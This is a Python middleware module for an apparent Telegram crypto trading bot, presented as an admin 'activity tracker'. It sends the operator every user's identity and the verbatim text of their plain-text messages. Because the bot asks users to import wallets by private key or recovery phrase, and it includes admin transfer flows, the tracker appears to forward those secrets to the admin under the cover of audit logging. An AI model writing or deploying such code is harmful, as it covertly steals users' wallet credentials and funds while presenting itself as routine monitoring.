"""
Activity Tracker — universal middleware for admin activity notifications.

Registered as a TypeHandler at handler group -1 so it fires before every
other handler but still allows all normal handlers to process the update
(each handler group is independent in PTB).

The notification is dispatched as a background task so it can never delay
the user's response, and failures are swallowed silently after retry.

Adding new actions
──────────────────
Add an entry to ACTION_LABELS or COMMAND_LABELS.  Any callback_data not in
the map falls back to prefix matching, then to the raw callback_data — so
new buttons are auto-tracked without touching this file.
"""
import asyncio
import re
from datetime import datetime, timezone

from telegram import Update
from telegram.ext import ContextTypes

from config import settings
from utils.logger import get_logger

logger = get_logger(__name__)


# ── Human-readable action labels ──────────────────────────────────────────────

COMMAND_LABELS: dict[str, str] = {
    "start": "🚀 /start — Bot started",
    "help":  "❓ /help — Help requested",
}

# Exact callback_data → label
ACTION_LABELS: dict[str, str] = {
    # ── Onboarding ─────────────────────────────────────────────────────────
    "menu:continue":         "▶️ Started Onboarding",

    # ── Main navigation ────────────────────────────────────────────────────
    "menu:dashboard":        "🏠 Opened Dashboard",
    "menu:wallet":           "💼 Opened Wallet",
    "menu:copytrade":        "📈 Opened Copy Trading",
    "menu:portfolio":        "📊 Opened Portfolio",
    "menu:autotrade":        "🤖 Opened Auto Trading",
    "menu:manage_wallets":   "👥 Opened Manage Wallets",
    "menu:settings":         "⚙️ Opened Settings",
    "menu:help":             "❓ Opened Help",

    # ── Wallet sub-menu ────────────────────────────────────────────────────
    "wallet:refresh":        "🔂 Refreshed Balance",
    "wallet:deposit":        "📥 Viewed Deposit Addresses",
    "wallet:history":        "📜 Viewed Transaction History",
    "wallet:transfer_menu":  "🔄 Opened Transfer",

    # ── Import wallet ──────────────────────────────────────────────────────
    "import:wallet":         "📥 Started Wallet Import",
    "import:pk":             "🔑 Import: Private Key Method",
    "import:mnemonic":       "📝 Import: Recovery Phrase Method",
    "import:chain:SOL":      "◎ Import: Selected Solana",
    "import:chain:ETH":      "Ξ Import: Selected Ethereum",
    "import:chain:BNB":      "🟡 Import: Selected BNB Chain",
    "import:confirm:yes":    "✅ Import: Confirmed",
    "import:confirm:no":     "❌ Import: Cancelled at Confirm",

    # ── Trading ────────────────────────────────────────────────────────────
    "trade:buy":             "🛒 Started Buy",
    "trade:sell":            "💰 Started Sell",
    "trade:transfer":        "🔄 Started Transfer",
    "trade:withdraw":        "💸 Started Withdrawal",

    # ── Chain selection ────────────────────────────────────────────────────
    "chain:SOL":             "◎ Selected Solana",
    "chain:ETH":             "Ξ Selected Ethereum",
    "chain:BNB":             "🟡 Selected BNB Chain",

    # ── Copy trading ───────────────────────────────────────────────────────
    "copy:add":              "➕ Copy Trading: Add Wallet",
    "copy:list":             "📋 Copy Trading: View Wallets",
    "copy:enable":           "▶️ Copy Trading: Enabled",
    "copy:disable":          "⏹ Copy Trading: Disabled",

    # ── Auto trading ───────────────────────────────────────────────────────
    "auto:enable":           "▶️ Auto Trading: Enabled",
    "auto:disable":          "⏹ Auto Trading: Disabled",
    "auto:config":           "⚙️ Auto Trading: Configure",

    # ── Settings ───────────────────────────────────────────────────────────
    "set:slippage":          "📉 Settings: Slippage",
    "set:priority_fee":      "⚡ Settings: Priority Fee",
    "set:notifications":     "🔔 Settings: Notifications",
    "set:language":          "🌐 Settings: Language",
    "set:defaults":          "🔧 Settings: Defaults",
    "set:default_sol":       "◎ Settings: Default SOL",
    "set:default_eth":       "Ξ Settings: Default ETH",
    "set:default_bnb":       "🟡 Settings: Default BNB",
    "set:stop_loss":         "🛑 Settings: Stop Loss",
    "set:take_profit":       "🎯 Settings: Take Profit",
    "set:max_trades":        "🔢 Settings: Max Daily Trades",

    # ── Managed wallets ────────────────────────────────────────────────────
    "mgwallet:add":          "➕ Manage Wallets: Add",
    "mgwallet:list":         "📋 Manage Wallets: View",
    "mgwallet:remove":       "🗑 Manage Wallets: Remove",

    # ── Withdrawal confirm / reject ────────────────────────────────────────
    "wd:confirm:yes":        "✅ Withdrawal: Submitted",

    # ── General ────────────────────────────────────────────────────────────
    "action:cancel":         "❌ Cancelled",
    "confirm:yes":           "✅ Confirmed",
    "confirm:no":            "❌ Declined Confirmation",

    # ── Admin panel (admin ID is excluded from notifications anyway) ────────
    "admin:transfer":        "🛡️ Admin: Started Transfer Flow",
    "admin:list_users":      "🛡️ Admin: Listed All Users",
    "admin:panel":           "🛡️ Admin: Returned to Panel",
    "admin:xfer:confirm":    "🛡️ Admin: Confirmed Transfer Execution",
    "admin:cancel":          "🛡️ Admin: Cancelled Action",
}

# Prefix patterns (checked in order when exact match fails)
PREFIX_LABELS: list[tuple[str, str]] = [
    (r"^import:chain:",          "Import: Selected Chain"),
    (r"^chain_sel:buy:",         "🛒 Buy: Selected Chain"),
    (r"^chain_sel:sell:",        "💰 Sell: Selected Chain"),
    (r"^chain_sel:transfer:",    "🔄 Transfer: Selected Chain"),
    (r"^chain_sel:withdraw:",    "💸 Withdraw: Selected Chain"),
    (r"^chain_sel:",             "Selected Chain"),
    (r"^copy:remove:",           "🗑 Copy Trading: Removed Wallet"),
    (r"^mgwallet:del:",          "🗑 Manage Wallets: Deleted"),
    (r"^admin:wd:approve:",      "✅ Admin: Approved Withdrawal"),
    (r"^admin:wd:reject:",       "❌ Admin: Rejected Withdrawal"),
    (r"^confirm:yes:",           "✅ Confirmed"),
    (r"^set:",                   "⚙️ Settings: Changed"),
    (r"^import:",                "📥 Import Action"),
    (r"^copy:",                  "📈 Copy Trading Action"),
    (r"^auto:",                  "🤖 Auto Trading Action"),
    (r"^trade:",                 "💹 Trade Action"),
    (r"^menu:",                  "🏠 Navigation"),
]

# Maximum length for plain-text message preview in notifications
_MAX_TEXT_PREVIEW = 200


def _resolve_action(update: Update) -> str | None:
    """Return a human-readable action label, or None if nothing to report."""

    # ── Text messages (commands AND plain text) ────────────────────────────
    if update.message and update.message.text:
        text = update.message.text.strip()
        if text.startswith("/"):
            cmd = text.split()[0].lstrip("/").split("@")[0].lower()
            return COMMAND_LABELS.get(cmd, f"⌨️ Command: /{cmd}")
        # Plain text — truncate long messages to keep notifications readable
        preview = text if len(text) <= _MAX_TEXT_PREVIEW else text[:_MAX_TEXT_PREVIEW] + "…"
        return f"💬 Message: {preview}"

    # ── Callback query (button press) ─────────────────────────────────────
    if update.callback_query and update.callback_query.data:
        data = update.callback_query.data

        # Exact match
        if data in ACTION_LABELS:
            return ACTION_LABELS[data]

        # Prefix match
        for pattern, label in PREFIX_LABELS:
            if re.match(pattern, data):
                return label

        # Unknown — include raw data so nothing slips through
        return f"🔘 Button: {data}"

    # ── Other update types (edited messages, etc.) ────────────────────────
    if update.edited_message and update.edited_message.text:
        preview = update.edited_message.text[:_MAX_TEXT_PREVIEW]
        return f"✏️ Edited message: {preview}"

    return None


def _fmt_user(tg_user) -> str:
    username = f"@{tg_user.username}" if tg_user.username else "no username"
    name = tg_user.first_name or "—"
    return f"`{tg_user.id}` · {username} · {name}"


# ── Main middleware handler ────────────────────────────────────────────────────

async def track_activity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Called for every Update via TypeHandler at group -1.
    Dispatches a background notification — never blocks the main handler.
    """
    admin_id = settings.admin_telegram_id
    if not admin_id:
        return

    tg_user = update.effective_user
    if not tg_user:
        return

    # Never notify the admin about their own actions (avoids infinite loops)
    if tg_user.id == admin_id:
        return

    action = _resolve_action(update)
    if not action:
        return

    # Fire and forget — errors are handled with retry inside the task
    asyncio.create_task(_send_activity(context.bot, tg_user, action))


async def _send_activity(bot, tg_user, action: str, max_attempts: int = 3) -> None:
    """Background task: send a compact activity notification to the admin with retry."""
    admin_id = settings.admin_telegram_id
    if not admin_id:
        return

    # Full date + time for precise audit trail
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    username = f"@{tg_user.username}" if tg_user.username else "no username"

    text = (
        f"👁 *Activity Monitor*\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 *ID:* `{tg_user.id}`\n"
        f"👤 *Username:* {username}\n"
        f"📛 *Name:* {tg_user.first_name or '—'}\n"
        f"🎯 *Action:* {action}\n"
        f"🕐 *Time:* `{ts}`"
    )

    for attempt in range(1, max_attempts + 1):
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=text,
                parse_mode="Markdown",
            )
            return
        except Exception as exc:
            if attempt < max_attempts:
                await asyncio.sleep(2 ** attempt)
            else:
                logger.warning(
                    "Activity notification failed after %d attempts (user=%s action=%s): %s",
                    max_attempts, tg_user.id, action, exc,
                )
